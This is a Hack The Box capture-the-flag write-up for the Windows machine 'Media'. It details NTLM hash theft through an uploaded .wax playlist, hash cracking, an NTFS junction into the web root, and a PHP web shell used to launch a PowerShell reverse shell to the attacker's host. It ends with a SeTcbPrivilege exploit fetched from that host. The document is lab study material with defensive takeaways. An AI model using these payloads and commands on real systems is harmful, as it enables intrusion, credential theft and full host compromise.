# HTB Write-Up: Media

| Field      | Details                                                     |
|------------|--------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Media)    |
| Difficulty | Medium                                                        |
| OS         | Windows                                                       |
| Author     | Babayev                                                          |
| Date       | June 16, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration — ProMotion Studio Application Form](#2-web-enumeration--promotion-studio-application-form)
3. [Initial Access — NTLM Theft via Malicious WMP Playlist](#3-initial-access--ntlm-theft-via-malicious-wmp-playlist)
4. [Hash Capture & Cracking](#4-hash-capture--cracking)
5. [Foothold — User Flag as enox](#5-foothold--user-flag-as-enox)
6. [Web Application Logic Abuse — Upload Folder Junction](#6-web-application-logic-abuse--upload-folder-junction)
7. [RCE via PHP Web Shell](#7-rce-via-php-web-shell)
8. [Privilege Escalation — SeTcbPrivilege Abuse](#8-privilege-escalation--setcbprivilege-abuse)
9. [Summary](#9-summary)

---

## 1. Reconnaissance

Port scanning began with **RustScan** for quick discovery, followed by a targeted **Nmap** service/version scan:

```bash
rustscan -a 10.129.234.67 --ulimit 5000
nmap -A 10.129.234.67 -p22,80,3389
```

**Open Ports:**

| Port  | Service       | Details                                            |
|-------|---------------|-----------------------------------------------------|
| 22    | SSH           | OpenSSH for_Windows_9.5                              |
| 80    | HTTP          | Apache 2.4.56 (Win64) / OpenSSL 1.1.1t / PHP 8.1.17  |
| 3389  | RDP           | Microsoft Terminal Services                           |

The HTTP service returned the page title **"ProMotion Studio"**. RDP NTLM info disclosed the hostname/workgroup **MEDIA** (a standalone host, not domain-joined). OS detection was inconclusive but pointed at a recent Windows Server build.

---

## 2. Web Enumeration — ProMotion Studio Application Form

Browsing the site revealed a job-application style form that accepted **file uploads** (intended for video submissions). Reviewing how the form handled uploads — and researching known abuse paths for file-upload functionality tied to **Windows Media Player** file types — pointed toward NTLM hash theft as a viable attack: certain file types (`.wax`, `.asx`, `.url`, `.lnk`, etc.) cause Windows to silently reach out over SMB to a remote host as soon as they are opened or previewed, leaking the requesting user's NTLMv2 hash.

The **[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)** tool was used to generate these weaponized files; it supports 21 different NTLM-leak techniques abusing "intended functionality" rather than macros or exploits, making the resulting files unlikely to be flagged by AV.

---

## 3. Initial Access — NTLM Theft via Malicious WMP Playlist

A malicious **Windows Media Player playlist (`.wax`)** file was generated, pointing back to the attacker's host:

```bash
python3 ntlm_theft.py -g wax -s 10.10.15.24 -f exploit
```

This produces a `.wax` playlist file that, once opened by Windows Media Player (or processed/previewed server-side), forces an outbound SMB authentication attempt to the attacker-controlled server — perfect for capturing a hash via the application's file-upload feature.

---

## 4. Hash Capture & Cracking

### 4.1 — Capturing the Hash with Responder

**Responder** was started to listen for the resulting SMB authentication attempt:

```bash
sudo responder -I tun1
```

After the malicious `.wax` file was submitted through the web form, Responder captured an inbound NTLMv2-SSP authentication attempt:

```
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:0f38232fcda63d98:9C18EB29F45A8F0767ABF198118A448C:0101...
```

The hash belonged to local user **`enox`**.

### 4.2 — Cracking with Hashcat

The captured NetNTLMv2 hash was cracked offline against `rockyou.txt`:

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

```
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
ENOX::MEDIA:...:1234virus@
```

Credentials recovered: **`enox : 1234virus@`**

---

## 5. Foothold — User Flag as enox

With valid credentials for `enox` and OpenSSH enabled on the box, a session was established and the user flag retrieved:

```powershell
enox@MEDIA C:\Users\enox\Desktop>type user.txt
bab43ff1318356845432d087d576766f
```

---

## 6. Web Application Logic Abuse — Upload Folder Junction

### 6.1 — Reviewing the Upload Handler

With a foothold on the box, the web root was inspected directly:

```powershell
enox@MEDIA C:\xampp\htdocs>type index.php
```

The relevant upload logic:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
...
$folderName = md5($firstname . $lastname . $email);
$targetDir  = $uploadDir . $folderName . '/';
...
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile);
```

Uploaded files are placed in a directory named by `md5(firstname + lastname + email)` under `C:\Windows\Tasks\Uploads\` — a location **outside** the web root (`C:\xampp\htdocs`), so uploaded files cannot normally be executed by the web server.

### 6.2 — Predicting the Hash & Creating a Junction

Because the folder name is a deterministic MD5 hash of attacker-controlled input (the form fields), the resulting directory name can be **predicted in advance**. This was abused to create an **NTFS junction** linking the predictable upload folder directly into the live web root:

```powershell
enox@MEDIA C:\>mklink /j C:\Windows\Tasks\Uploads\32bf6513a06b70b8337154768be38e53 C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\32bf6513a06b70b8337154768be38e53 <<===>> C:\xampp\htdocs
```

Any file subsequently uploaded through the web form using the firstname/lastname/email combination that hashes to `32bf6513a06b70b8337154768be38e53` would now be written **directly into the web root**, making it web-accessible and executable as PHP.

---

## 7. RCE via PHP Web Shell

A minimal PHP web shell was uploaded through the form (landing in the junctioned directory, and therefore in the live web root):

```php
<?php system($_GET['cmd']); ?>
```

The shell was reached directly via the web server and used to execute a Base64-encoded PowerShell reverse shell payload:

```
GET /Challange_PLD/sprint/1/cmd.php?cmd=powershell -e <base64>
```

A listener caught the resulting callback:

```bash
rlwrap nc -nvlp 1338
```

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.234.67] 57280
PS C:\xampp\htdocs>
```

---

## 8. Privilege Escalation — SeTcbPrivilege Abuse

### 8.1 — Privilege Enumeration

```powershell
PS C:\xampp\htdocs> whoami /priv
```

```
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
```

The process token held **`SeTcbPrivilege`** ("Act as part of the operating system") — a highly sensitive right that, when held (even if disabled by default), lets a process impersonate the Trusted Computing Base and forge arbitrary user tokens via the LSA, effectively enabling privilege escalation to `SYSTEM`/Administrator-equivalent actions.

### 8.2 — Exploiting SeTcbPrivilege

The **[SeTcbPrivilege-Abuse](https://github.com/b4lisong/SeTcbPrivilege-Abuse)** PoC tool was cloned and cross-compiled for the target:

```bash
git clone https://github.com/b4lisong/SeTcbPrivilege-Abuse.git
x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation.exe -lsecur32 -municode
```

The compiled binary was served and pulled onto the target through the existing shell:

```bash
python3 -m http.server 80
```

```powershell
PS C:\xampp\htdocs> iwr http://10.10.15.24/TcbElevation-x64.exe -outfile TcbElevation-x64.exe
```

### 8.3 — Privilege Escalation to Administrator

The tool was used to abuse `SeTcbPrivilege` and add `enox` to the local **Administrators** group:

```powershell
PS C:\xampp\htdocs> .\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add'
```

Despite a service-start error in the tool's own output, the underlying privileged action succeeded — confirmed by checking group membership:

```powershell
enox@MEDIA C:\Users\Administrator\Desktop>net user enox
...
Local Group Memberships      *Administrators
```

### 8.4 — Root Flag

With `enox` now a local Administrator, the root flag was retrieved directly:

```powershell
enox@MEDIA C:\Users\Administrator\Desktop>type root.txt
7856cf8864250ef3b6be5dbfbf4def91
```

---

## 9. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | SSH, HTTP (ProMotion Studio), RDP open; standalone host MEDIA |
| Web Enumeration | Manual review | Job-application upload form identified as attack surface |
| Initial Access | `ntlm_theft` (.wax) | Malicious WMP playlist uploaded to trigger outbound SMB auth |
| Hash Capture | Responder | NTLMv2-SSP hash captured for local user `enox` |
| Cracking | Hashcat + rockyou.txt | Password recovered: `1234virus@` |
| Foothold | SSH login as `enox` | User flag retrieved |
| Source Review | `index.php` inspection | Upload path is `md5(firstname+lastname+email)`, predictable |
| Web Root Pivot | NTFS junction (`mklink /j`) | Predictable upload folder linked into live web root |
| RCE | PHP web shell + PowerShell | Reverse shell obtained via uploaded `cmd.php` |
| PrivEsc | SeTcbPrivilege abuse (`TcbElevation`) | `enox` added to local Administrators |
| Root | Direct file read | `root.txt` retrieved as Administrator |

### Key Takeaways

- **File-upload features are NTLM-theft vectors.** Any application or workflow that opens, previews, or processes uploaded files on a Windows host (even indirectly) can be abused with crafted file types (`.wax`, `.asx`, `.url`, `.lnk`, etc.) to coerce outbound SMB authentication and leak NTLMv2 hashes.

- **Deterministic, attacker-influenced hashing for storage paths is dangerous.** Deriving an upload directory name from attacker-controlled fields (`md5(firstname+lastname+email)`) makes that path **predictable**, allowing pre-staged NTFS junctions or symlinks to redirect uploads into sensitive or web-accessible locations. Upload directories should use cryptographically random, server-generated names that are never derived from user input.

- **Uploads outside the web root are not inherently safe.** Storing uploads outside `htdocs` is a good control, but it's defeated entirely if the storage path can be predicted and linked back in via filesystem junctions/symlinks.

- **SeTcbPrivilege is a critical privilege escalation primitive.** Even when a process token shows the privilege as "Disabled," holding `SeTcbPrivilege` allows a custom LSA-aware tool to enable it and forge arbitrary security contexts — a direct path to SYSTEM/Administrator. Service accounts and application pools should never run with this privilege unless absolutely required, and its presence should be flagged immediately during privilege audits.

- **Weak password hygiene on service/local accounts remains a major risk.** A single weak password (`1234virus@`), once exposed via NTLM relay/theft, was sufficient to pivot from "no foothold" to a full user shell.
